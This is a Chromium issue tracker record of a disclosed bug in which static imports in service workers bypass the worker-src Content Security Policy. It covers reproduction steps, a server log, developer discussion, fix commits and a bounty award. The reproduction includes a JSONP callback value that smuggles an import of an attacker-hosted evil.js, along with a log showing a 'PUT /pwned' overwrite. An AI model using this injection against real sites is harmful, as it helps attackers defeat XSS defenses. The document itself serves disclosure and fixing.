# static `import` declarations in service workers do not respect `worker-src` CSP directive

| Field | Value |
|-------|-------|
| **Issue ID** | [485785246](https://issues.chromium.org/issues/485785246) |
| **Status** | Fixed |
| **Severity** | S3-Low |
| **Priority** | P3 |
| **Component** | Blink>SecurityFeature>ContentSecurityPolicy |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | al...@gmail.com |
| **Assignee** | an...@chromium.org |
| **Created** | 2026-02-19 |
| **Bounty** | $1,000.00 |

## Description

## VULNERABILITY DETAILS

### Summary

Content Security Policy (CSP) is not properly enforced for service workers. Specifically, a service worker can execute static `import` declarations to load module scripts from sources that are not specified in the `worker-src` directive or its fallback directives.

### Attack Preconditions

- The attacker already has the ability to execute JavaScript on the target website via XSS.
- The attacker can load a service worker from an endpoint allowed by the `worker-src` directive (or its fallback directives), and the response of that endpoint can be fully or partially controlled by the attacker (e.g., a JSONP endpoint).

### Impact Analysis

If CSP were properly enforced for service workers, an attacker with XSS capabilities would be restricted from importing an external module within a Service Worker unless the attacker-controlled source was allowed by the `worker-src` directive or its fallbacks.

However, because CSP is not enforced for service workers during static import, an attacker can bypass CSP restrictions, allowing the service worker to import modules from arbitrary sources. This makes XSS mitigations less effective. For example, an attacker might be unable to execute certain payloads due to input validation or a WAF, but bypassing CSP with this bug to import an external script might help them circumvent these restrictions. (I have demonstrated this impact in the provided reproduction case by using a JSONP endpoint that implements input validation.)

## VERSION

Chrome Version: 145.0.7632.76 stable

Operating System: Linux, Mac, Windows

This vulnerability is also present in Chrome 147.0.7692.0 canary.

## REPRODUCTION CASE

1. Create a directory structure like this with the attached files:
   ```
   .
   ├── evil.js
   ├── index.html
   └── server.py
   
   ```
2. Create a virtual environment and install the required packages to run the server:
   ```
   python3 -m venv .venv
   source ./.venv/bin/activate
   python3 -m pip install 'uvicorn[standard]==0.41.0' fastapi==0.129.0
   
   ```
3. Update the `/etc/hosts` file to make `cross-origin.test` resolve to `127.0.0.1`.
4. Run the `server.py` script:
   ```
   python3 server.py
   
   ```
   The server has the following endpoints (Note: you can check the comments and code in the provided attachments for more details):
   - `/`: Serves `index.html` with `default-src 'none'; script-src 'self' 'unsafe-inline';` CSP header.
   - `/api`: A JSONP endpoint with `default-src 'none';` CSP header.
   - `/evil.js`: Serves a malicious `evil.js` script, simulating a cross-origin server controlled by an attacker.
5. Visit `http://localhost:1337/` with Chrome.
6. The page will attempt to register a service worker via the JSONP endpoint.
7. The service worker will attempt a static import to load `//cross-origin.test:1337/evil.js`.
8. Even though the CSP of `/` endpoint is set to `default-src 'none'; script-src 'self' 'unsafe-inline';`, you will see that the service worker still successfully imports the script from `http://cross-origin.test:1337/evil.js`.
9. After reloading the page, you will see that the response for the `/` endpoint has been overwritten by `evil.js`, rendering an HTML page without any CSP restrictions.

If successfully reproduced, the expected log of the server should look like this:

```
$ python3 server.py
INFO:     Started server process [89241]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     Uvicorn running on http://127.0.0.1:1337 (Press CTRL+C to quit)
INFO:     127.0.0.1:59315 - "GET / HTTP/1.1" 200 OK
INFO:     Valid callback: import'//cross-origin.test:1337/evil.js';//
INFO:     127.0.0.1:59317 - "GET /api?callback=import%27//cross-origin.test:1337/evil.js%27;// HTTP/1.1" 200 OK
INFO:     Host: cross-origin.test:1337
INFO:     127.0.0.1:59318 - "GET /evil.js HTTP/1.1" 200 OK
INFO:     127.0.0.1:59315 - "PUT /pwned HTTP/1.1" 404 Not Found

```
## CREDIT INFORMATION

Reporter credit: lebr0nli of National Yang Ming Chiao Tung University, Dept. of CS, Security and Systems Lab.

## Attachments

- [index.html](attachments/index.html) (text/html, 910 B)
- [evil.js](attachments/evil.js) (text/javascript, 793 B)
- [server.py](attachments/server.py) (text/x-python, 2.5 KB)

## Timeline

### ma...@google.com (2026-02-19)

antoniosartori@, could you please help with an assessment here, and route further if you're not the right person to own this?

### an...@chromium.org (2026-02-20)

Thanks for you report. I believe you are correct that there is a bug here.

When loading a module (and also a worker module) with static imports, the creating document CSP should be enforced on the whole dependency chain. This seems to work properly for dedicated workers, but not for service workers (and also not for shared workers).

I would say that this has no security implications at all, because if an attacker controls the response of the parent fetch then it's game over anyway. We still should fix this though.

### an...@chromium.org (2026-02-20)

Also, my understanding is that this is a relatively complex change. The root of the dependency chain is a fetch initiated by the browser process, which hence has the right CSP at hand. The descendants are fetched via the renderer, and I think at that point the CSP is not available anymore. We should find a way to plumb it through.

### al...@gmail.com (2026-02-20)

redacted

### li...@chromium.org (2026-02-24)

[security shepherd] Converting type from vulnerability to bug.

### al...@gmail.com (2026-02-27)

redacted

### an...@chromium.org (2026-02-27)

Sorry, I believe you are right that this should remain a security vulnerability as this is a bug in a web security feature. I apparently did a mistake when downgrading the severity - sorry for it.

I guess you are also right that this can, under specific circumstances, have security implications. Since I believe we agree that this bug has ["extreme mitigating factors or highly limited scope"](https://chromium.googlesource.com/chromium/src/+/HEAD/docs/security/severity-guidelines.md#toc-low-severity), I think S3 is appropriate here.

Sorry for the mistake.

### al...@gmail.com (2026-02-27)

No worries at all, and thank you for taking another look at this!

And yeah, I agree the current severity is appropriate. Thanks for your time and help!

### ch...@google.com (2026-02-27)

Setting Priority to P3 to match Severity s3. To ensure SLOs are tracked correctly, priority must exceed severity.

### dx...@google.com (2026-03-03)

Project: chromium/src  

Branch:  main  

Author:  Antonio Sartori [antoniosartori@chromium.org](mailto:antoniosartori@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7603873>

[CSP] Add WPTs for workers with cross-origin static imports

---


Expand for full commit details
```
     
    This CL adds web platform tests to verify the Content Security Policy 
    check on resources triggered by module workers via static imports. 
     
    Bug: 485785246 
    Change-Id: I64e05cb1764d624f87a94d2520904119007d0c9b 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7603873 
    Reviewed-by: Mike West <mkwst@chromium.org> 
    Commit-Queue: Antonio Sartori <antoniosartori@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1593253}

```

---

Files:

- A `third_party/blink/web_tests/external/wpt/content-security-policy/worker-src/service-worker-static-import-blocked.https.sub-expected.txt`
- A `third_party/blink/web_tests/external/wpt/content-security-policy/worker-src/service-worker-static-import-blocked.https.sub.html`

---

Hash: [0e9dbe4e58d8963d710a62cad4177969c535f804](https://chromiumdash.appspot.com/commit/0e9dbe4e58d8963d710a62cad4177969c535f804)  

Date: Tue Mar 3 16:10:52 2026


---

### dx...@google.com (2026-03-05)

Project: chromium/src  

Branch:  main  

Author:  Antonio Sartori [antoniosartori@chromium.org](mailto:antoniosartori@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7603479>

Include PolicyContainerPolicies in FetchClientSettingsObject

---


Expand for full commit details
```
     
    This CL changes the FetchClientSettingsObject to include the whole 
    PolicyContainerPolicies instead of just referrer policy. This requires 
    some boilerplate in order to convert between public and non-public 
    types in blink. 
     
    For now, this CL is a no-op, but in a follow-up CL we'll use this to 
    fix Content Security Policy checks for static imports in service 
    workers. 
     
    Bug: 485785246 
    Change-Id: Ic23708c92e4f4c3bfa4d14d4a21007dc18619c48 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7603479 
    Commit-Queue: Antonio Sartori <antoniosartori@chromium.org> 
    Reviewed-by: Mike West <mkwst@chromium.org> 
    Reviewed-by: Hiroki Nakagawa <nhiroki@chromium.org> 
    Reviewed-by: Ben Reich <benreich@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1594628}

```

---

Files:

- M `content/renderer/worker/fetch_client_settings_object_helpers.cc`
- M `third_party/blink/public/mojom/BUILD.gn`
- M `third_party/blink/public/platform/web_fetch_client_settings_object.h`
- M `third_party/blink/renderer/core/BUILD.gn`
- M `third_party/blink/renderer/core/exported/web_shared_worker_impl.cc`
- M `third_party/blink/renderer/core/frame/build.gni`
- D `third_party/blink/renderer/core/frame/csp/conversion_util.cc`
- D `third_party/blink/renderer/core/frame/csp/conversion_util.h`
- D `third_party/blink/renderer/core/frame/csp/test_util.cc`
- M `third_party/blink/renderer/core/frame/csp/test_util.h`
- M `third_party/blink/renderer/core/frame/frame_test_helpers.cc`
- M `third_party/blink/renderer/core/frame/policy_container.cc`
- M `third_party/blink/renderer/core/frame/web_remote_frame_impl.cc`
- M `third_party/blink/renderer/core/loader/mixed_content_checker_test.cc`
- M `third_party/blink/renderer/core/script/fetch_client_settings_object_impl.cc`
- M `third_party/blink/renderer/core/script/fetch_client_settings_object_impl.h`
- M `third_party/blink/renderer/core/testing/page_test_base.cc`
- M `third_party/blink/renderer/modules/exported/web_embedded_worker_impl.cc`
- M `third_party/blink/renderer/modules/service_worker/web_embedded_worker_impl_test.cc`
- M `third_party/blink/renderer/platform/loader/BUILD.gn`
- M `third_party/blink/renderer/platform/loader/fetch/fetch_client_settings_object.h`
- M `third_party/blink/renderer/platform/loader/fetch/fetch_client_settings_object_snapshot.cc`
- M `third_party/blink/renderer/platform/loader/fetch/fetch_client_settings_object_snapshot.h`
- M `third_party/blink/renderer/platform/loader/fetch/null_resource_fetcher_properties.cc`
- A `third_party/blink/renderer/platform/loader/fetch/policy_container_utils.cc`
- A `third_party/blink/renderer/platform/loader/fetch/policy_container_utils.h`
- R `third_party/blink/renderer/platform/loader/fetch/policy_container_utils_fuzzer.cc`
- R `third_party/blink/renderer/platform/loader/fetch/policy_container_utils_test.cc`
- M `third_party/blink/renderer/platform/loader/fetch/resource_fetcher_properties_test.cc`
- M `third_party/blink/renderer/platform/loader/testing/test_resource_fetcher_properties.cc`
- M `tools/code_coverage/coverage_consts.py`

---

Hash: [f0e69bffcf1af52dc5fa41cb04f82ea16d61a07c](https://chromiumdash.appspot.com/commit/f0e69bffcf1af52dc5fa41cb04f82ea16d61a07c)  

Date: Thu Mar 5 13:53:32 2026


---

### dx...@google.com (2026-03-05)

Project: chromium/src  

Branch:  main  

Author:  Antonio Sartori [antoniosartori@chromium.org](mailto:antoniosartori@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7606759>

Wire up PolicyContainerPolicies in mojo::FetchClientSettingsObject

---


Expand for full commit details
```
     
    This CL adds the PolicyContainerPolicies in the 
    FetchClientSettingsObject mojo type, and ensures that the Content 
    Security Policy of the outside environment is used when starting a 
    service worker. 
     
    In particular, this fixes Content Security Policy enforcement for 
    static imports in a service worker module. 
     
    Bug: 485785246 
    Change-Id: I87926d6fe075c7c37f344d5fbfe85e70ad04d11a 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromium/src/+/7606759 
    Commit-Queue: Antonio Sartori <antoniosartori@chromium.org> 
    Reviewed-by: Hiroki Nakagawa <nhiroki@chromium.org> 
    Reviewed-by: Arthur Sonzogni <arthursonzogni@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#1594629}

```

---

Files:

- M `content/browser/background_fetch/background_fetch_test_base.cc`
- M `content/browser/background_sync/background_sync_manager_unittest.cc`
- M `content/browser/background_sync/background_sync_service_impl_test_harness.cc`
- M `content/browser/content_index/content_index_database_unittest.cc`
- M `content/browser/cookie_store/cookie_store_manager_unittest.cc`
- M `content/browser/devtools/devtools_background_services_context_impl_unittest.cc`
- M `content/browser/notifications/blink_notification_service_impl_unittest.cc`
- M `content/browser/notifications/notification_storage_unittest.cc`
- M `content/browser/notifications/platform_notification_context_unittest.cc`
- M `content/browser/payments/payment_app_content_unittest_base.cc`
- M `content/browser/service_worker/embedded_worker_instance.cc`
- M `content/browser/service_worker/service_worker_container_host_unittest.cc`
- M `content/browser/service_worker/service_worker_context_core.cc`
- M `content/browser/service_worker/service_worker_context_core_unittest.cc`
- M `content/browser/service_worker/service_worker_context_unittest.cc`
- M `content/browser/service_worker/service_worker_context_watcher_unittest.cc`
- M `content/browser/service_worker/service_worker_context_wrapper.cc`
- M `content/browser/service_worker/service_worker_controllee_request_handler.cc`
- M `content/browser/service_worker/service_worker_job_unittest.cc`
- M `content/browser/service_worker/service_worker_loader_helpers.cc`
- M `content/browser/service_worker/service_worker_new_script_fetcher_unittest.cc`
- M `content/browser/service_worker/service_worker_register_job.cc`
- M `content/browser/service_worker/service_worker_registration_unittest.cc`
- M `content/browser/service_worker/service_worker_single_script_update_checker_unittest.cc`
- M `content/browser/service_worker/service_worker_test_utils.cc`
- M `content/browser/service_worker/service_worker_test_utils.h`
- M `content/browser/service_worker/service_worker_version_browsertest.cc`
- M `content/browser/worker_host/dedicated_worker_service_impl_unittest.cc`
- M `content/browser/worker_host/shared_worker_host_unittest.cc`
- M `content/browser/worker_host/shared_worker_service_impl_unittest.cc`
- M `content/browser/worker_host/worker_script_fetcher.cc`
- M `content/renderer/policy_container_util.cc`
- M `content/renderer/policy_container_util.h`
- M `content/renderer/worker/fetch_client_settings_object_helpers.cc`
- M `third_party/blink/public/mojom/loader/fetch_client_settings_object.mojom`
- M `third_party/blink/renderer/core/workers/shared_worker_client_holder.cc`
- M `third_party/blink/renderer/modules/exported/web_embedded_worker_impl.cc`
- M `third_party/blink/renderer/modules/service_worker/service_worker_global_scope.cc`
- M `third_party/blink/renderer/modules/service_worker/service_worker_registration.cc`
- M `third_party/blink/web_tests/external/wpt/content-security-policy/worker-src/service-worker-static-import-blocked.https.sub-expected.txt`

---

Hash: [ed578172dee48b52caefabbdc351a6aadc16c553](https://chromiumdash.appspot.com/commit/ed578172dee48b52caefabbdc351a6aadc16c553)  

Date: Thu Mar 5 13:56:13 2026


---

### ch...@google.com (2026-03-05)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ch...@google.com (2026-03-05)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### sp...@google.com (2026-05-18)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $1000.00 for this report.

Rationale for this decision:
Baseline. Exploitation Mitigation Bypass


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-12)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/485785246)*
